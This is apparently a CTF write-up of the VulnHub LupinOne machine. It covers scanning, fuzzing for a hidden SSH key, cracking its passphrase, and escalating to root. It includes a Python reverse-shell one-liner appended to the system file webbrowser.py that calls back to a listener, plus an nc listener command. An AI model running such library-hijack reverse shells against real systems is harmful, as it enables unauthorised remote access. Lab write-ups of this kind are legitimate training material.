---
title: Lupin - Writeup
author: Elman Alizadeh
date: 2022-04-28 14:10:00 +0800
categories: [ctf, VulnHub]
tags: [vulnhub, lupin]
---

Today we will take a look at Vulnhub: LupinOne. My goal in sharing this writeup is to show you the way if you are in trouble. Please try to understand each step and take notes.

![Desktop View]({{ "/assets/img/vuln-lupin/1.png" | relative_url }})

## Network scan

Command: sudo nmap -p- -sV -sC -oN nmap/open 192.168.0.110 — open

![Desktop View]({{ "/assets/img/vuln-lupin/2.png" | relative_url }})

Let’s look at the “~ myfiles” extension.

![Desktop View]({{ "/assets/img/vuln-lupin/3.png" | relative_url }})

## FFUF

Command: ffuf -u ‘http://lupin/~FUZZ' -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

![Desktop View]({{ "/assets/img/vuln-lupin/4.png" | relative_url }})

![Desktop View]({{ "/assets/img/vuln-lupin/5.png" | relative_url }})

Here we have a username. Now let’s find his private key file. As we know, private keys “.” is written after the symbol.

Command: ffuf -u ‘http://lupin/~secret/.FUZZ' -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e .txt,.pub -fw 20

![Desktop View]({{ "/assets/img/vuln-lupin/6.png" | relative_url }})

![Desktop View]({{ "/assets/img/vuln-lupin/7.png" | relative_url }})

We found the encrypted text. Let’s look at cyberchef to decrypt. After researching, I found that it was base58

[CyberChef](https://gchq.github.io/CyberChef/)

![Desktop View]({{ "/assets/img/vuln-lupin/8.png" | relative_url }})

Let’s check the connection to the target machine.

![Desktop View]({{ "/assets/img/vuln-lupin/9.png" | relative_url }})

We use the fasttrack.txt file to crack the passphrase password, as stated in the message.

![Desktop View]({{ "/assets/img/vuln-lupin/10.png" | relative_url }})

![Desktop View]({{ "/assets/img/vuln-lupin/11.png" | relative_url }})

```console
Command: echo ‘import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((“IP”,4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(“/bin/sh”)’ >> /usr/lib/python3.9/webbrowser.py
```

Command: nc -nvlp 4242

Command: sudo -u arsene /usr/bin/python3.9 /home/arsene/heist.py

![Desktop View]({{ "/assets/img/vuln-lupin/12.png" | relative_url }})

![Desktop View]({{ "/assets/img/vuln-lupin/13.png" | relative_url }})

[Gfto/pip](https://gtfobins.github.io/gtfobins/pip/)

![Desktop View]({{ "/assets/img/vuln-lupin/14.png" | relative_url }})

## And now we are the root

![Desktop View]({{ "/assets/img/vuln-lupin/1.gif" | relative_url }})

“If you have any questions or comments, please do not hesitate to write. Have a good days”










